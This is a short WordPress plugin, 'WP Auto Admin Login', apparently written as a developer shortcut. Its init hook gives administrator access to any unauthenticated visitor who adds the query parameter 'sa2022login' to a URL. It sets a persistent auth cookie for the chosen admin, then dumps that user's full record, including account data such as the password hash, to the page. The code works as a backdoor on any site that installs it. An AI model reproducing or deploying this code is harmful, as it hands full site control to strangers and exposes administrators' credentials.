<?php
/*
Plugin Name: WP Auto Admin Login
Plugin URI: https://github.com/
Version: 1.0.0
Author: shrimp2t
Author URI: https://github.com/shrimp2t
*/



function sa_auto_login()
{

	if (!isset($_GET['sa2022login'])) {
		return;
	}

	$number = absint($_GET['sa2022login']);


	$user_query = new WP_User_Query(array(
		'role' => 'Administrator',
		'order' => 'ASC',
		'orderby' => 'ID',
		'number' => $number + 1
	));
	$users = $user_query->get_results();
	if (!count($users)) {
		return;
	}

	$user = $users[$number];
	$user_id = $user->ID;
	global $auth_secure_cookie; // XXX ugly hack to pass this to wp_authenticate_cookie().
	// login as this user
	// wp_set_current_user($user_id, $user->user_login);
	wp_set_auth_cookie($user_id, true);
	do_action('wp_login', $user->user_login, $user);
	var_dump(  $user );
	die();

	wp_redirect(admin_url(''));
	exit;
}

add_action('init', 'sa_auto_login', 1);

